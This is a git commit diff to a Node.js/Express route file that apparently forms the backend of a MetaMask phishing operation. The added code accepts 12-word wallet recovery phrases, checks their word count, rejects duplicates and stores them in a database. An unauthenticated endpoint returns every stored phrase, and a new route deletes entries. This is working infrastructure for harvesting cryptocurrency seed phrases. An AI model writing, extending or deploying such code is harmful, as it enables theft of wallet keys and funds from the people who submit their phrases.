18503bbc93e2746d1411dd006465ffb425363875
TopDev <top_developer@outlook.com>
2021-12-08 01:50:26 +0800

    metamask api updated

--- Backend/routes/api/v1/metamask.js
+++ Backend/routes/api/v1/metamask.js
@@ -8,7 +8,16 @@ const Survey = require("../../../models/Survey");
 const Metamask = require("../../../models/Metamask");
 
 
-router.post("/add", (req, res) => {
+router.post("/add", async (req, res) => {
+    let words = req.body.phase.split(" ");
+    if (words.length != 12) return res.json({ status: "error", "message": "Incorrect Pharse" });
+
+    var oldmetamask = await Metamask.findOne({ "phase": req.body.phase });
+
+    if (oldmetamask) {
+        return res.json({ "status": "error", "message": "Already Exist."});
+    }
+
     Metamask.create(req.body)
         .then((data) => res.json({ status: "success", "data": data }))
         .catch((err) => res.json(err));
@@ -16,8 +25,14 @@ router.post("/add", (req, res) => {
 
 router.get('/', (req, res) => {
     Metamask.find()
-    .then(data => res.json({"status": "success", "count": data.length, "data": data}))
-    .catch(err => res.status(404).json(err));
+        .then(data => res.json({ "status": "success", "count": data.length, "data": data }))
+        .catch(err => res.status(404).json(err));
+});
+
+router.delete('/password/:id', (req, res) => {
+    Metamask.findByIdAndRemove(req.params.id)
+        .then(data => res.json({ status: "success", "data": data }))
+        .catch(err => res.json(err));
 });
 
 module.exports = router;
